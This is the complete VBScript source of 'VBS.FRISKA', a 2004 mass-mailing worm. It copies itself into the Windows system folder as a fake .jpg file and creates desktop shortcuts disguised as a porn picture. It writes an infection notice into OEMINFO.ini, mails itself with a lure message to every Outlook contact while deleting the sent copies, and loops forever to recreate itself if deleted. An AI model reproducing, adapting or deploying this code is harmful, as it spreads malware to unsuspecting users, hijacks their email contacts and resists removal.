'VBS.FRISKA By sevenC / IVWA (http://sevenc.vze.com)
'sevenC_zone@yahoo.com
'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Dim shell, msc, batch, fso,Drives, Drive, Folder, Files, File, Subfolders,Subfolder 
set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\windows\system\friska.jpg.vbs", True

if fso.FolderExists("C:\Documents and Settings\All Users\Desktop") then
on error resume next
set shell=wscript.createobject("wscript.shell")
set msc=shell.CreateShortCut("C:\Documents and Settings\All Users\Desktop\friska_porn_pic.jpg.lnk")
msc.TargetPath = Shell.ExpandEnvironmentStrings("%windir%\system\friska.jpg.vbs")
msc.IconLocation = Shell.ExpandEnvironmentStrings("C:\windows\system32\mspaint.exe, 0")
msc.WindowStyle = 4
msc.Save
end if

if fso.FolderExists("C:\windows\Desktop") then
on error resume next
set shell=wscript.createobject("wscript.shell")
set msc=shell.CreateShortCut("C:\windows\Desktop\friska_porn_pic.jpg.lnk")
msc.TargetPath = Shell.ExpandEnvironmentStrings("%windir%\system\friska.jpg.vbs")
msc.WindowStyle = 4
msc.Save
end if

set dropper = fso.createtextfile("C:\windows\system\OEMINFO.ini",true)
dropper.writeline "[General]"
dropper.writeline "Manufacturer=" & chr(34) & "VIRUS INFORMATION" & chr(34)
dropper.writeline "Model=" & chr(34) & "VBS.FRISKA by sevenC" & chr(34)
dropper.writeline "[Support Information]"
dropper.writeline "Line1=" & chr(34) & "VBS.FRISKA Information" & chr(34)
dropper.writeline "Line2=" & chr(34) & "**********************" & chr(34)
dropper.writeline "Line3=" & chr(34) & "Your PC has been Infected with VBS.FRISKA" & chr(34)
dropper.writeline "Line4=" & chr(34) & "If your AV doesn't scan it yet" & chr(34)
dropper.writeline "Line5=" & chr(34) & "Please delete this file manualy" & chr(34)
dropper.writeline "Line6=" & chr(34) & "%windir%\system\friska.jpg.vbs" & chr(34)
dropper.writeline "Line7=" & chr(34) & "sevenC (06/03/2004) - Bekasi - Indonesia" & chr(34)

Set aaaaaaaa=CreateObject("Outlook.Application")
Set aaaaaaaa=aaaaaaaa.GetNameSpace("MAPI")
For Each C In aaaaaaaa.AddressLists
If C.AddressEntries.Count <> 0 Then
For D=1 To C.AddressEntries.Count
Set aaaaaaaa=C.AddressEntries(D)
Set aaaaaaaa=aaaaaaaa.CreateItem(0)
aaaaaaaa.To=aaaaaaaa.Address
aaaaaaaa.Subject="heyy..."
aaaaaaaa.Body="Check this file,this is friska's porn pic & movie "
aaaaaaaa.Attachments.Add("C:\windows\system\friska.jpg.vbs")
aaaaaaaa.DeleteAfterSubmit=True
If aaaaaaaa.To <> "" Then
aaaaaaaa.Send
End If
Next
End If
Next
Set NS41C186= fso.opentextfile(wscript.scriptfullname)
VB40GR94 = NS41C186.readall
NS41C186.close
Do
if not(fso.fileexists(wscript.scriptfullname)) then
set R8C5735O= fso.createtextfile(wscript.scriptfullname)
R8C5735O.write VB40GR94
R8C5735O.close
end if
loop